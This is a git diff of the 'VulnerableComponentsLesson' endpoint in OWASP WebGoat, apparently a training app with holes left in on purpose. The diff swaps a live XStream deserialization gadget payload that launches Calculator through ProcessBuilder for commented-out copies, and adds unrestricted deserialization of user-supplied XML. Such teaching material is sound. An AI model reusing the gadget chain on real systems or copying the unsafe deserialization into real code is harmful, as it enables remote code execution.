@@ -1,6 +1,7 @@
 package org.owasp.webgoat.plugin;
 
-import com.thoughtworks.xstream.XStream;
+import java.io.IOException;
+
 import org.owasp.webgoat.assignments.AssignmentEndpoint;
 import org.owasp.webgoat.assignments.AssignmentPath;
 import org.owasp.webgoat.assignments.AttackResult;
@@ -9,7 +10,8 @@ import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
 
-import java.io.IOException;
+import com.thoughtworks.xstream.XStream;
+import com.thoughtworks.xstream.io.xml.DomDriver;
 
 /**
  * *************************************************************************************************
@@ -50,34 +52,50 @@ public class VulnerableComponentsLesson extends AssignmentEndpoint {
 
 	@RequestMapping(method = RequestMethod.POST)
 	public @ResponseBody AttackResult completed(@RequestParam String payload) throws IOException {
-		String process = "open"; 		
-		String arguments = "/Applications/Calculator.app";		
+
 		
-		String payload2 = "<sorted-set>" +  
-						 "<string>foo</string>" +
-						 "<dynamic-proxy>" + 
-						 "<interface>java.lang.Comparable</interface>" +
-						 "<handler class=\"java.beans.EventHandler\">" +
-						 "    <target class=\"java.lang.ProcessBuilder\">" +
-						 "         <command>" +
-						 "             <string>" + process + "</string>" +
-						 "             <string>" + arguments + "</string>" +
-						 "        </command>" +
-						 "    </target>" +
-						 "    <action>start</action>" +
-						 "</handler>" + 
-						 "</dynamic-proxy>" + 						
-						"</sorted-set>";
-		XStream xstream = new XStream();
-		String xml = (String)xstream.fromXML(payload2);
-       if (!payload.toString().equals("")) {
-            return trackProgress(success()
-                .feedback("vulnerable-components")
-                .feedbackArgs(xml)
-                .build());
-        } else {
+        XStream xstream = new XStream(new DomDriver());
+//        xstream.processAnnotations(Contact.class);
+//        xstream.registerConverter(new ContactConverter());
+//        xstream.registerConverter(new CatchAllConverter(), XStream.PRIORITY_VERY_LOW);
+ 
+//        Contact c = new Contact();
+//        c.setName("Alvaro");
+//        String sc = xstream.toXML(c);
+//        System.out.println(sc);
+
+
+//        String payload2 = "<sorted-set>" +
+//                "<string>foo</string>" +
+//                "<dynamic-proxy>" +
+//                "<interface>java.lang.Comparable</interface>" +
+//                "<handler class=\"java.beans.EventHandler\">" +
+//                " <target class=\"java.lang.ProcessBuilder\">" +
+//                " <command>" +
+//                " <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>" +
+//                " </command>" +
+//                " </target>" +
+//                " <action>start</action>" +
+//                "</handler>" +
+//                "</dynamic-proxy>" +
+//                "</sorted-set>";
+
+        try {
+//        	System.out.println("Payload:" + payload);
+            Contact expl = (Contact) xstream.fromXML(payload);
+            return trackProgress(success().feedback("vulnerable-components.fromXML").feedbackArgs(expl.toString()).build());
+
+        } catch (com.thoughtworks.xstream.converters.ConversionException ex) {
+        	ex.printStackTrace();
+        	if (ex.getMessage().contains("Integer"))
+        	{
+                return trackProgress(success().feedback("vulnerable-components.success").build());
+        	}
             return trackProgress(failed().feedback("vulnerable-components.close").build());
-        }
+
+       }
+
+ 
 
 	}
 }
